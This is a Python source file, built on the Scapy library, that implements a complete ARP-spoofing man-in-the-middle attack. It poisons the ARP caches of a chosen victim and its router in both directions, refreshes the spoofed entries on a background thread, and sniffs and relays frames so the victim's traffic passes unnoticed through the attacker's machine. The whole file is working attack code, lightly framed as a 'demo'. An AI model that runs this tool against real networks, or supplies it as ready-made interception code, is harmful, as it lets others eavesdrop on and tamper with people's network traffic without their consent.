import os
import time
import threading
from typing import Optional
from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp, sniff

# Resolve a MAC for the given target IP using ARP and return it (or None if unanswered).
def _resolve_mac(ip: str) -> str:
    """
    Resolve a target IP to a MAC address using ARP. Returns None if unknown.
    """
    # Scapy getmacbyip issues an ARP who-has on the LAN and returns the MAC if answered.
    return getmacbyip(ip)


# Build an ARP reply for target_ip/target_mac that claims spoof_ip is at attacker_mac.
def _build_spoof_packet(target_ip: str, target_mac: str, spoof_ip: str, attacker_mac: str) -> ARP:
    """
    Craft an ARP reply telling target_ip that spoof_ip is at attacker_mac.
    """
    # op=2 is "is-at" (ARP reply); pdst/hwdst are the target IP/MAC; psrc/hwsrc are the spoofed sender.
    return ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)


# Pick interface from provided_iface/SCAPY_IFACE/route toward target_ip for Scapy I/O.
def _select_iface(target_ip: str, provided_iface: Optional[str] = None) -> str:
    """
    Choose an interface: explicit CLI > SCAPY_IFACE env > routing decision.
    """
    if provided_iface:
        return provided_iface
    env_iface = os.environ.get("SCAPY_IFACE")
    if env_iface:
        return env_iface
    # conf.route.route returns (iface, gw, src_ip) for routing toward the target.
    route_iface = conf.route.route(target_ip)[0]
    return route_iface or conf.iface


# Craft and repeatedly send spoofed ARP replies between victim_ip and router_ip on iface.
def _poison_bidirectional(
    victim_ip: str,
    router_ip: str,
    count: int = 3,
    interval: float = 2.0,
    iface: Optional[str] = None,
):
    chosen_iface = _select_iface(victim_ip, iface)
    # conf.iface sets Scapy's default interface for send/sniff calls.
    conf.iface = chosen_iface

    # get_if_hwaddr returns the MAC address of the selected interface.
    attacker_mac = get_if_hwaddr(chosen_iface)

    mac_victim = _resolve_mac(victim_ip)
    mac_router = _resolve_mac(router_ip)

    if not mac_victim or not mac_router:
        print("[!] Could not resolve MACs for victim and router. Aborting ARP demo.")
        return

    pkt_to_victim = _build_spoof_packet(victim_ip, mac_victim, router_ip, attacker_mac)
    pkt_to_router = _build_spoof_packet(router_ip, mac_router, victim_ip, attacker_mac)
    # Ether() builds the L2 header; "/" stacks Ether/ARP into a single frame.
    frame_victim = Ether(src=attacker_mac, dst=mac_victim) / pkt_to_victim
    frame_router = Ether(src=attacker_mac, dst=mac_router) / pkt_to_router

    print(f"[i] Poisoning victim {victim_ip} (MAC {mac_victim}) saying {router_ip} is at {attacker_mac}")
    print(f"[i] Poisoning router {router_ip} (MAC {mac_router}) saying {victim_ip} is at {attacker_mac}")

    # Keep sending spoofed frames via chosen_iface until stop_event is set.
    def poison_loop(stop_event: threading.Event):
        # Periodically refresh spoofed ARP entries to keep MITM active.
        while not stop_event.is_set():
            # sendp() sends raw L2 frames, bypassing the host IP stack.
            sendp(frame_victim, verbose=False, iface=chosen_iface)
            sendp(frame_router, verbose=False, iface=chosen_iface)
            time.sleep(interval)

    stop_event = threading.Event()
    poison_thread = threading.Thread(target=poison_loop, args=(stop_event,), daemon=True)
    poison_thread.start()

    return chosen_iface, attacker_mac, mac_victim, mac_router, stop_event, poison_thread


# Forward Ethernet frames between mac_victim and mac_router that arrive for attacker_mac.
def _bridge_loop(mac_victim: str, mac_router: str, attacker_mac: str, iface: str, stop_event: threading.Event) -> None:
    """
    Minimal L2 bridge: forward frames between the victim and router that arrive at us.
    """
    print("[i] Forwarding traffic between victim and router (Ctrl+C to stop)...")

    mtu = 1500

    # Rewrite L2 headers and relay frames between victim and router.
    def forward(pkt):
        if not pkt.haslayer(Ether):
            return
        # Drop oversized frames to avoid forwarding jumbo frames unintentionally.
        if len(pkt) > mtu:
            return
        eth = pkt[Ether]
        # Only forward frames that were meant for us (the attacker MAC).
        if eth.dst != attacker_mac:
            return
        if eth.src == mac_victim:
            pkt = pkt.copy()
            pkt[Ether].src = attacker_mac
            pkt[Ether].dst = mac_router
            sendp(pkt, iface=iface, verbose=False)
        elif eth.src == mac_router:
            pkt = pkt.copy()
            pkt[Ether].src = attacker_mac
            pkt[Ether].dst = mac_victim
            sendp(pkt, iface=iface, verbose=False)

    # sniff() captures L2 frames; prn=forward is called for each packet.
    sniff(iface=iface, prn=forward, store=False, stop_filter=lambda _: stop_event.is_set())


# Orchestrate MITM: poison victim/router ARP caches, then bridge their traffic.
def run(victim_ip: str, router_ip: str, count: int = 3, interval: float = 2.0, iface: Optional[str] = None) -> None:
    """
    Demonstrate MITM by poisoning the victim and router ARP caches and forwarding traffic.
    """
    # Start poisoning + forwarding in one flow so traffic continues between victim and router.
    poisoned = _poison_bidirectional(victim_ip, router_ip, count=count, interval=interval, iface=iface)
    if not poisoned:
        return
    chosen_iface, attacker_mac, mac_victim, mac_router, stop_event, poison_thread = poisoned
    try:
        _bridge_loop(mac_victim, mac_router, attacker_mac, chosen_iface, stop_event)
    except KeyboardInterrupt:
        print("\n[i] Stopping forwarding loop.")
    finally:
        stop_event.set()
        poison_thread.join(timeout=1.0)
